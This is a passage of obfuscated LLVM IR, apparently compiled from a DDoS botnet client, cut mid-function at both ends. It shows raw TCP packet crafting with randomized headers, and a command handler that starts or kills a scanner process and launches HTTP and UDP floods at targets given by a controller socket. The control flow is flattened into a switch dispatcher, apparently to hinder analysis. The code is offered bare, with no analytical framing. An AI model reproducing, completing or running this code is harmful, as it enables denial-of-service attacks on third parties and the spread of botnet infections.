  %294 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 8
  store i32 %293, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 3
  store i16 %297, i16* %299, align 4
  %300 = call i32 @rand_cmwc()
  %301 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 0
  %303 = bitcast %union.anon.0* %302 to %struct.anon.1*
  %304 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %303, i32 0, i32 2
  store i32 %300, i32* %304, align 4
  %305 = call i32 @rand_cmwc()
  %306 = trunc i32 %305 to i16
  %307 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %308 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %307, i32 0, i32 0
  %309 = bitcast %union.anon.0* %308 to %struct.anon.1*
  %310 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %309, i32 0, i32 0
  store i16 %306, i16* %310, align 4
  %311 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %312 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %311, i32 0, i32 0
  %313 = bitcast %union.anon.0* %312 to %struct.anon.1*
  %314 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %313, i32 0, i32 6
  store i16 0, i16* %314, align 4
  %315 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %316 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %317 = call zeroext i16 @tcpcsum(%struct.iphdr* %315, %struct.tcphdr* %316)
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 6
  store i16 %317, i16* %321, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %322 = bitcast i8* %.reload6 to i16*
  %323 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %324 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %323, i32 0, i32 2
  %325 = load i16, i16* %324, align 2
  %326 = zext i16 %325 to i32
  %327 = call zeroext i16 @csum(i16* %322, i32 %326)
  %328 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 7
  store i16 %327, i16* %329, align 2
  %330 = load i32, i32* %25, align 4
  %331 = load i32, i32* %15, align 4
  %332 = icmp eq i32 %330, %331
  %333 = select i1 %332, i32 56147030, i32 -352059398
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %336 = load i32, i32* %24, align 4
  %337 = icmp sgt i32 %335, %336
  %338 = select i1 %337, i32 23874718, i32 -477408551
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  store i32 1813720, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  store i32 0, i32* %25, align 4
  store i32 577377529, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %25, align 4
  %343 = add i32 %342, 1
  store i32 %343, i32* %25, align 4
  store i32 577377529, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %345)
  store i32 -93671103, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %344, %341, %340, %339, %334, %287, %286, %262, %257, %255, %237, %236, %234, %233, %232, %231, %230, %229, %221, %216, %208, %203, %195, %190, %182, %177, %169, %164, %160, %157, %121, %73, %67, %66, %62, %61, %55, %54, %47, %46, %40, %35, %31, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #1

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  store i32 %34, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 998071113, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  %.reg2mem8 = alloca i32
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 998071113, label %first
    i32 -1824800548, label %37
    i32 -1123847359, label %38
    i32 -955701797, label %45
    i32 -503926425, label %52
    i32 -343548549, label %56
    i32 -2003068721, label %57
    i32 765625120, label %60
    i32 -547786235, label %67
    i32 -609040229, label %71
    i32 -368177849, label %72
    i32 1783592029, label %77
    i32 1206672145, label %79
    i32 -682652522, label %83
    i32 245891113, label %84
    i32 1443244677, label %85
    i32 303600066, label %88
    i32 1120222980, label %89
    i32 624485086, label %96
    i32 1628775711, label %100
    i32 -1724374774, label %107
    i32 -78794515, label %114
    i32 -1793584713, label %115
    i32 -1435608694, label %119
    i32 -301477964, label %120
    i32 -451206243, label %159
    i32 1043928716, label %166
    i32 1351231827, label %170
    i32 450195742, label %177
    i32 -84130387, label %184
    i32 486388009, label %191
    i32 -1991050691, label %198
    i32 -1014020314, label %205
    i32 -310533810, label %212
    i32 768856349, label %219
    i32 -609532730, label %223
    i32 1140970574, label %230
    i32 -413676715, label %231
    i32 139839032, label %254
    i32 -1559405817, label %259
    i32 893262201, label %260
    i32 -109176834, label %264
    i32 1777021627, label %269
    i32 1456835585, label %270
    i32 -157988862, label %274
    i32 1418632242, label %279
    i32 1559159012, label %280
    i32 421485895, label %285
    i32 -412241331, label %288
    i32 -235788167, label %292
    i32 195532684, label %296
    i32 -1337914526, label %305
    i32 -2112633162, label %307
    i32 1407068712, label %308
    i32 -309539788, label %312
    i32 -1599646572, label %321
    i32 -1203000997, label %322
    i32 176947051, label %323
    i32 -1915035823, label %330
    i32 -815998215, label %334
    i32 1335157155, label %341
    i32 -1902629545, label %348
    i32 -890750843, label %355
    i32 2049465449, label %362
    i32 -455834007, label %366
    i32 -564082489, label %373
    i32 1766389210, label %377
    i32 1565261942, label %384
    i32 -1458449848, label %385
    i32 -6792578, label %407
    i32 -1937823040, label %412
    i32 271183001, label %413
    i32 -1295591810, label %417
    i32 -1403195339, label %422
    i32 -917608865, label %423
    i32 728595900, label %428
    i32 -1689090158, label %431
    i32 -1616474090, label %435
    i32 1811590275, label %439
    i32 -898223510, label %447
    i32 -1738151599, label %449
    i32 1153546933, label %450
    i32 2117612058, label %454
    i32 -2013927072, label %462
    i32 1177007252, label %463
    i32 -1980566219, label %464
    i32 1491876350, label %471
    i32 2001252443, label %475
    i32 2009078631, label %482
    i32 2099486418, label %489
    i32 813620292, label %490
    i32 2131884128, label %506
    i32 1971346143, label %509
    i32 -735030246, label %513
    i32 -1887068123, label %517
    i32 552164935, label %521
    i32 1172954843, label %523
    i32 1147880012, label %524
    i32 1906400057, label %528
    i32 1593906929, label %529
    i32 -1422741028, label %533
    i32 -1180294616, label %534
    i32 20783243, label %541
    i32 1197735659, label %542
    i32 1304222695, label %547
    i32 -1474805823, label %554
    i32 -1345391485, label %562
    i32 -982351851, label %570
    i32 -1010783426, label %571
    i32 850162056, label %574
    i32 -252323774, label %575
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %35 = icmp ne i32 %.reload, 0
  %36 = select i1 %35, i32 -1123847359, i32 -1824800548
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcmp(i8* %41, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.396, i32 0, i32 0)) #10
  %43 = icmp ne i32 %42, 0
  %44 = select i1 %43, i32 1120222980, i32 -955701797
  store i32 %44, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8**, i8*** %4, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.397, i32 0, i32 0)) #10
  %50 = icmp ne i32 %49, 0
  %51 = select i1 %50, i32 765625120, i32 -503926425
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* @scanPid, align 4
  %54 = icmp eq i32 %53, 0
  %55 = select i1 %54, i32 -343548549, i32 -2003068721
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* @scanPid, align 4
  %59 = call i32 @kill(i32 %58, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  store i32 765625120, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i8**, i8*** %4, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @strcmp(i8* %63, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.398, i32 0, i32 0)) #10
  %65 = icmp ne i32 %64, 0
  %66 = select i1 %65, i32 303600066, i32 -547786235
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* @scanPid, align 4
  %69 = icmp ne i32 %68, 0
  %70 = select i1 %69, i32 -609040229, i32 -368177849
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = call i32 @fork() #2
  store i32 %73, i32* %5, align 4
  store i32 1000, i32* %6, align 4
  store i32 10, i32* %7, align 4
  %74 = load i32, i32* %5, align 4
  %75 = icmp ugt i32 %74, 0
  %76 = select i1 %75, i32 1783592029, i32 1206672145
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i32, i32* %5, align 4
  store i32 %78, i32* @scanPid, align 4
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %5, align 4
  %81 = icmp eq i32 %80, -1
  %82 = select i1 %81, i32 -682652522, i32 245891113
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  store i32 1443244677, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  %86 = load i32, i32* %7, align 4
  %87 = load i32, i32* %6, align 4
  call void @StartTheLelz(i32 %86, i32 %87)
  call void @_exit(i32 0) #12
  unreachable

; <label>:88:                                     ; preds = %loopEntry
  store i32 1120222980, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i8**, i8*** %4, align 8
  %91 = getelementptr inbounds i8*, i8** %90, i64 0
  %92 = load i8*, i8** %91, align 8
  %93 = call i32 @strcmp(i8* %92, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.399, i32 0, i32 0)) #10
  %94 = icmp ne i32 %93, 0
  %95 = select i1 %94, i32 -451206243, i32 624485086
  store i32 %95, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %3, align 4
  %98 = icmp slt i32 %97, 6
  %99 = select i1 %98, i32 -78794515, i32 1628775711
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 3
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @atoi(i8* %103) #10
  %105 = icmp slt i32 %104, 1
  %106 = select i1 %105, i32 -78794515, i32 -1724374774
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = load i8**, i8*** %4, align 8
  %109 = getelementptr inbounds i8*, i8** %108, i64 5
  %110 = load i8*, i8** %109, align 8
  %111 = call i32 @atoi(i8* %110) #10
  %112 = icmp slt i32 %111, 1
  %113 = select i1 %112, i32 -78794515, i32 -1793584713
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  %116 = call i32 @listFork()
  %117 = icmp ne i32 %116, 0
  %118 = select i1 %117, i32 -1435608694, i32 -301477964
  store i32 %118, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* @HeliosCommSock, align 4
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 1
  %124 = load i8*, i8** %123, align 8
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = load i8**, i8*** %4, align 8
  %129 = getelementptr inbounds i8*, i8** %128, i64 3
  %130 = load i8*, i8** %129, align 8
  %131 = call i32 @atoi(i8* %130) #10
  %132 = load i8**, i8*** %4, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 5
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134) #10
  %136 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %121, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.400, i32 0, i32 0), i8* %124, i8* %127, i32 %131, i32 %135)
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 1
  %139 = load i8*, i8** %138, align 8
  %140 = load i8**, i8*** %4, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 2
  %142 = load i8*, i8** %141, align 8
  %143 = load i8**, i8*** %4, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145) #10
  %147 = trunc i32 %146 to i16
  %148 = load i8**, i8*** %4, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 4
  %150 = load i8*, i8** %149, align 8
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 5
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #10
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 6
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @atoi(i8* %157) #10
  call void @sendHTTP(i8* %139, i8* %142, i16 zeroext %147, i8* %150, i32 %154, i32 %158)
  call void @exit(i32 0) #14
  unreachable

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 0
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.401, i32 0, i32 0)) #10
  %164 = icmp ne i32 %163, 0
  %165 = select i1 %164, i32 176947051, i32 1043928716
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i32, i32* %3, align 4
  %168 = icmp slt i32 %167, 6
  %169 = select i1 %168, i32 1140970574, i32 1351231827
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i8**, i8*** %4, align 8
  %172 = getelementptr inbounds i8*, i8** %171, i64 3
  %173 = load i8*, i8** %172, align 8
  %174 = call i32 @atoi(i8* %173) #10
  %175 = icmp eq i32 %174, -1
  %176 = select i1 %175, i32 1140970574, i32 450195742
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 2
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp eq i32 %181, -1
  %183 = select i1 %182, i32 1140970574, i32 -84130387
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 4
  %187 = load i8*, i8** %186, align 8
  %188 = call i32 @atoi(i8* %187) #10
  %189 = icmp eq i32 %188, -1
  %190 = select i1 %189, i32 1140970574, i32 486388009
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 5
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  %196 = icmp eq i32 %195, -1
  %197 = select i1 %196, i32 1140970574, i32 -1991050691
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i8**, i8*** %4, align 8
  %200 = getelementptr inbounds i8*, i8** %199, i64 5
  %201 = load i8*, i8** %200, align 8
  %202 = call i32 @atoi(i8* %201) #10
  %203 = icmp sgt i32 %202, 65536
  %204 = select i1 %203, i32 1140970574, i32 -1014020314
  store i32 %204, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 5
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @atoi(i8* %208) #10
  %210 = icmp sgt i32 %209, 65500
  %211 = select i1 %210, i32 1140970574, i32 -310533810
  store i32 %211, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i8**, i8*** %4, align 8
  %214 = getelementptr inbounds i8*, i8** %213, i64 4
  %215 = load i8*, i8** %214, align 8
  %216 = call i32 @atoi(i8* %215) #10
  %217 = icmp sgt i32 %216, 32
  %218 = select i1 %217, i32 1140970574, i32 768856349
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %3, align 4
  %221 = icmp eq i32 %220, 7
  %222 = select i1 %221, i32 -609532730, i32 -413676715
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 6
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp slt i32 %227, 1
  %229 = select i1 %228, i32 1140970574, i32 -413676715
  store i32 %229, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load i8**, i8*** %4, align 8
  %233 = getelementptr inbounds i8*, i8** %232, i64 1
  %234 = load i8*, i8** %233, align 8
  store i8* %234, i8** %8, align 8
  %235 = load i8**, i8*** %4, align 8
  %236 = getelementptr inbounds i8*, i8** %235, i64 2
  %237 = load i8*, i8** %236, align 8
  %238 = call i32 @atoi(i8* %237) #10
  store i32 %238, i32* %9, align 4
  %239 = load i8**, i8*** %4, align 8
  %240 = getelementptr inbounds i8*, i8** %239, i64 3
  %241 = load i8*, i8** %240, align 8
  %242 = call i32 @atoi(i8* %241) #10
  store i32 %242, i32* %10, align 4
  %243 = load i8**, i8*** %4, align 8
  %244 = getelementptr inbounds i8*, i8** %243, i64 4
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 @atoi(i8* %245) #10
  store i32 %246, i32* %11, align 4
  %247 = load i8**, i8*** %4, align 8
  %248 = getelementptr inbounds i8*, i8** %247, i64 5
  %249 = load i8*, i8** %248, align 8
  %250 = call i32 @atoi(i8* %249) #10
  store i32 %250, i32* %12, align 4
  %251 = load i32, i32* %3, align 4
  %252 = icmp sgt i32 %251, 6
  %253 = select i1 %252, i32 139839032, i32 -1559405817
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 6
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #10
  store i32 893262201, i32* %switchVar
  store i32 %258, i32* %.reg2mem2
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  store i32 893262201, i32* %switchVar
  store i32 1000, i32* %.reg2mem2
  br label %loopEnd

; <label>:260:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  store i32 %.reload3, i32* %13, align 4
  %261 = load i32, i32* %3, align 4
  %262 = icmp sgt i32 %261, 7
  %263 = select i1 %262, i32 -109176834, i32 1777021627
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 7
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* %267) #10
  store i32 1456835585, i32* %switchVar
  store i32 %268, i32* %.reg2mem4
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  store i32 1456835585, i32* %switchVar
  store i32 1000000, i32* %.reg2mem4
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %14, align 4
  %271 = load i32, i32* %3, align 4
  %272 = icmp sgt i32 %271, 8
  %273 = select i1 %272, i32 -157988862, i32 1418632242
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 8
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  store i32 1559159012, i32* %switchVar
  store i32 %278, i32* %.reg2mem6
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  store i32 1559159012, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %15, align 4
  %281 = load i8*, i8** %8, align 8
  %282 = call i8* @strstr(i8* %281, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #10
  %283 = icmp ne i8* %282, null
  %284 = select i1 %283, i32 421485895, i32 1407068712
  store i32 %284, i32* %switchVar
  br label %loopEnd

; <label>:285:                                    ; preds = %loopEntry
  %286 = load i8*, i8** %8, align 8
  %287 = call i8* @strtok(i8* %286, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %287, i8** %16, align 8
  store i32 -412241331, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8*, i8** %16, align 8
  %290 = icmp ne i8* %289, null
  %291 = select i1 %290, i32 -235788167, i32 -2112633162
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  %293 = call i32 @listFork()
  %294 = icmp ne i32 %293, 0
  %295 = select i1 %294, i32 -1337914526, i32 195532684
  store i32 %295, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  %297 = load i8*, i8** %16, align 8
  %298 = load i32, i32* %9, align 4
  %299 = load i32, i32* %10, align 4
  %300 = load i32, i32* %11, align 4
  %301 = load i32, i32* %12, align 4
  %302 = load i32, i32* %13, align 4
  %303 = load i32, i32* %14, align 4
  %304 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %297, i32 %298, i32 %299, i32 %300, i32 %301, i32 %302, i32 %303, i32 %304)
  call void @_exit(i32 0) #12
  unreachable

; <label>:305:                                    ; preds = %loopEntry
  %306 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.389, i32 0, i32 0)) #2
  store i8* %306, i8** %16, align 8
  store i32 -412241331, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  store i32 -1203000997, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = call i32 @listFork()
  %310 = icmp ne i32 %309, 0
  %311 = select i1 %310, i32 -1599646572, i32 -309539788
  store i32 %311, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i8*, i8** %8, align 8
  %314 = load i32, i32* %9, align 4
  %315 = load i32, i32* %10, align 4
  %316 = load i32, i32* %11, align 4
  %317 = load i32, i32* %12, align 4
  %318 = load i32, i32* %13, align 4
  %319 = load i32, i32* %14, align 4
  %320 = load i32, i32* %15, align 4
  call void @sendUDP(i8* %313, i32 %314, i32 %315, i32 %316, i32 %317, i32 %318, i32 %319, i32 %320)
  call void @_exit(i32 0) #12
  unreachable

; <label>:321:                                    ; preds = %loopEntry
  store i32 -1203000997, i32* %switchVar
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  store i32 -252323774, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 0
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.402, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  %329 = select i1 %328, i32 -1980566219, i32 -1915035823
  store i32 %329, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %3, align 4
  %332 = icmp slt i32 %331, 6
  %333 = select i1 %332, i32 1565261942, i32 -815998215
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i8**, i8*** %4, align 8
  %336 = getelementptr inbounds i8*, i8** %335, i64 3
  %337 = load i8*, i8** %336, align 8
  %338 = call i32 @atoi(i8* %337) #10
  %339 = icmp eq i32 %338, -1
  %340 = select i1 %339, i32 1565261942, i32 1335157155
  store i32 %340, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i8**, i8*** %4, align 8
  %343 = getelementptr inbounds i8*, i8** %342, i64 2
  %344 = load i8*, i8** %343, align 8
  %345 = call i32 @atoi(i8* %344) #10
  %346 = icmp eq i32 %345, -1
  %347 = select i1 %346, i32 1565261942, i32 -1902629545
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i8**, i8*** %4, align 8
  %350 = getelementptr inbounds i8*, i8** %349, i64 4
  %351 = load i8*, i8** %350, align 8
  %352 = call i32 @atoi(i8* %351) #10
  %353 = icmp eq i32 %352, -1
  %354 = select i1 %353, i32 1565261942, i32 -890750843
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 4
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #10
  %360 = icmp sgt i32 %359, 32
  %361 = select i1 %360, i32 1565261942, i32 2049465449
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = load i32, i32* %3, align 4
  %364 = icmp sgt i32 %363, 6
